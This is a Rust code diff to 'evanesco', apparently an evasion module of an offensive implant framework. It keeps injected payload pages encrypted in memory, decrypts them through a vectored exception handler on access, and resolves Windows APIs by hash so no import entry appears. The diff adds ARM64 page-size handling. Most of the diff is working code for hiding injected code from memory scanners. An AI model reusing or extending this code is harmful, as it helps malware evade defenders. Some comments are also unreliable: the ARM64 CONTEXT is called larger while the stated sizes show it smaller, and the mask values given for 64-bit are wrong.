@@ -25,6 +25,27 @@
 //! - **`injection_engine.rs`**: Payload code sections are enrolled for
 //!   tracking after injection.
 //!
+//! # Architecture Compatibility
+//!
+//! The module is architecture-neutral.  On x86-64 and ARM64 Windows the same
+//! code path is used because:
+//!
+//! - The VEH handler reads only `ExceptionRecord.ExceptionInformation[]`
+//!   (architecture-independent).  It does **not** manipulate the `CONTEXT`
+//!   structure — no `CONTEXT.Rip` (x86-64) or `CONTEXT.Pc` (ARM64) access.
+//!
+//! - After decrypting the page and returning `EXCEPTION_CONTINUE_EXECUTION`,
+//!   the kernel re-executes the faulting instruction by restoring the
+//!   saved `CONTEXT`, which contains the correct `Rip`/`Pc` for the platform.
+//!
+//! - The page size is queried at runtime via `GetSystemInfo` rather than
+//!   hard-coded to 4 KB.  ARM64 Windows uses 4 KB pages by default but may
+//!   use 16 KB pages on some configurations (Apple Silicon via Parallels,
+//!   Snapdragon X dev kits with custom firmware).
+//!
+//! - NtProtectVirtualMemory, XChaCha20-Poly1305, and the background thread
+//!   are all architecture-independent.
+//!
 //! # Feature gate
 //!
 //! The entire module is compiled only when both `cfg(windows)` and the
@@ -67,6 +88,88 @@ const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
 
 /// Current process pseudo-handle (-1).
 const CURRENT_PROCESS: u64 = std::u64::MAX;
+
+// ── Runtime page size ────────────────────────────────────────────────────────
+//
+// ARM64 Windows uses 4 KB pages by default (4096 = 0x1000), but some
+// configurations use 16 KB pages (16384 = 0x4000).  We query the actual
+// page size once at startup via GetSystemInfo and derive the mask from it.
+//
+// On x86-64, this is always 4096 (0x1000).
+//
+// The static is initialized in `init()` before any pages are enrolled.
+// Until `init()` runs, `page_mask()` panics — but no page operations
+// should happen before init anyway.
+
+/// Cached page size in bytes.
+static PAGE_SIZE: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+
+/// Cached page mask for alignment (e.g. `!0xFFF` for 4 KB pages).
+static PAGE_MASK: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+
+/// Return the system page size, querying it on first call.
+///
+/// Uses `GetSystemInfo` resolved via pe_resolve (no IAT entry).
+/// Falls back to 4096 (standard 4 KB) if resolution fails.
+fn query_page_size() -> usize {
+    type FnGetSystemInfo = unsafe extern "system" fn(*mut u8); // SYSTEM_INFO*
+
+    // SYSTEM_INFO layout (first 5 fields we care about, 32 bytes total header):
+    //   0..2   wProcessorArchitecture (WORD)
+    //   2..4   wReserved (WORD)
+    //   4..8   dwPageSize (DWORD)
+    //   8..16  lpMinimumApplicationAddress (PVOID)
+    //   16..24 lpMaximumApplicationAddress (PVOID)
+    //   24..32 dwActiveProcessorMask (DWORD_PTR)
+    // Total size: 48 bytes on 64-bit.
+    #[repr(C)]
+    #[derive(Default)]
+    struct SystemInfo {
+        w_processor_architecture: u16,
+        _w_reserved: u16,
+        dw_page_size: u32,
+        _rest: [u64; 5], // enough padding for full struct
+    }
+
+    let fn_ptr: Option<FnGetSystemInfo> = (|| unsafe {
+        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let hash = pe_resolve::hash_str(b"GetSystemInfo\0");
+        let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
+        Some(std::mem::transmute::<usize, FnGetSystemInfo>(addr))
+    })();
+
+    match fn_ptr {
+        Some(get_system_info) => {
+            let mut info: SystemInfo = unsafe { std::mem::zeroed() };
+            unsafe { get_system_info(&mut info as *mut SystemInfo as *mut u8) };
+            let sz = info.dw_page_size as usize;
+            if sz > 0 && sz.is_power_of_two() {
+                log::info!("evanesco: system page size = {} bytes", sz);
+                sz
+            } else {
+                log::warn!("evanesco: GetSystemInfo returned invalid page size {}, defaulting to 4096", sz);
+                4096
+            }
+        }
+        None => {
+            log::warn!("evanesco: cannot resolve GetSystemInfo, defaulting to 4096 byte pages");
+            4096
+        }
+    }
+}
+
+/// Return the page mask for alignment, initializing it on first call.
+///
+/// For 4 KB pages this returns `!0xFFF = 0xFFFFF000`.
+/// For 16 KB pages this returns `!0x3FFF = 0xFFFFC000`.
+fn page_mask() -> usize {
+    *PAGE_MASK.get().expect("evanesco: page_mask() called before init()")
+}
+
+/// Return the system page size.
+fn page_size() -> usize {
+    *PAGE_SIZE.get().expect("evanesco: page_size() called before init()")
+}
 
 // ── XChaCha20-Poly1305 constants ─────────────────────────────────────────────
 
@@ -553,6 +656,14 @@ static GLOBAL_TRACKER: OnceLock<Arc<PageTrackerInner>> = OnceLock::new();
 /// - `idle_threshold_ms`: Pages idle longer than this are re-encrypted.
 /// - `scan_interval_ms`: Background thread scan interval.
 pub fn init(idle_threshold_ms: u64, scan_interval_ms: u64) -> Result<()> {
+    // Query and cache the system page size / mask on first init.
+    // On ARM64 Windows this may be 4096 or 16384; on x86-64 always 4096.
+    if PAGE_SIZE.get().is_none() {
+        let sz = query_page_size();
+        let _ = PAGE_SIZE.set(sz);
+        let _ = PAGE_MASK.set(!(sz - 1));
+    }
+
     let inner = Arc::new(PageTrackerInner {
         pages: RwLock::new(HashMap::new()),
         crypto_sidecar: RwLock::new(HashMap::new()),
@@ -791,6 +902,24 @@ static VEH_TRACKER_PTR: AtomicPtr<PageTrackerInner> = AtomicPtr::new(std::ptr::n
 ///    read → PAGE_READONLY, write → PAGE_READWRITE, execute → PAGE_EXECUTE_READ.
 /// 4. Returns `EXCEPTION_CONTINUE_EXECUTION` to resume the faulting
 ///    instruction.
+///
+/// # ARM64 Compatibility
+///
+/// This handler is **architecture-neutral**: it reads only
+/// `ExceptionRecord.ExceptionInformation[]` and never accesses the
+/// `ContextRecord` (i.e., never reads `CONTEXT.Rip` on x86-64 or
+/// `CONTEXT.Pc` on ARM64).
+///
+/// On return, `EXCEPTION_CONTINUE_EXECUTION` causes the kernel to restore
+/// the saved `CONTEXT` and re-execute the faulting instruction.  On ARM64
+/// the faulting PC is in `CONTEXT.Pc`; on x86-64 it is in `CONTEXT.Rip`.
+/// Because we never modify the `CONTEXT`, the correct register is used
+/// transparently.
+///
+/// The ARM64 CONTEXT layout is significantly larger than x86-64
+/// (sizeof(CONTEXT) = 912 on ARM64 vs ~1232 on x86-64 for full context),
+/// but this is irrelevant because we never touch it.  The exception
+/// dispatcher handles saving/restoring CONTEXT for us.
 unsafe extern "system" fn veh_handler(
     exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
 ) -> i32 {
@@ -835,7 +964,7 @@ unsafe extern "system" fn veh_handler(
     }
 
     // Quick check: page-align the fault address and see if it's tracked.
-    let page_base = fault_addr & !0xFFF;
+    let page_base = fault_addr & page_mask();
     {
         let pages = match inner.pages.read() {
             Ok(g) => g,
@@ -953,7 +1082,7 @@ pub fn enroll(base: *mut u8, size: usize, orig_protect: u32, label: &str) -> Res
         .ok_or_else(|| anyhow!("evanesco: not initialised"))?;
 
     // Page-align base.
-    let aligned_base = (base as usize) & !0xFFF;
+    let aligned_base = (base as usize) & page_mask();
     // P2-06: Overflow check for base + size calculation.
     let end_raw = (base as usize).checked_add(size).ok_or_else(|| {
         anyhow!(
@@ -962,7 +1091,9 @@ pub fn enroll(base: *mut u8, size: usize, orig_protect: u32, label: &str) -> Res
             size
         )
     })?;
-    let end = ((end_raw + 0xFFF) & !0xFFF);
+    let mask = page_mask();
+    let ps = page_size();
+    let end = ((end_raw + ps - 1) & mask);
     let aligned_size = end - aligned_base;
 
     let mut info = PageInfo {
@@ -1197,11 +1328,12 @@ pub(crate) fn status_json() -> String {
     }
 
     format!(
-        r#"{{"total_pages":{},"encrypted":{},"decrypted_rw":{},"decoded_rx":{},"idle_threshold_ms":{},"scan_interval_ms":{},"encrypt_count":{},"decrypt_count":{}}}"#,
+        r#"{{"total_pages":{},"encrypted":{},"decrypted_rw":{},"decoded_rx":{},"page_size":{},"idle_threshold_ms":{},"scan_interval_ms":{},"encrypt_count":{},"decrypt_count":{}}}"#,
         total,
         encrypted,
         decrypted_rw,
         decoded_rx,
+        PAGE_SIZE.get().copied().unwrap_or(0),
         inner.idle_threshold_ms.load(Ordering::Relaxed),
         inner.scan_interval_ms.load(Ordering::Relaxed),
         inner.encrypt_count.load(Ordering::Relaxed),
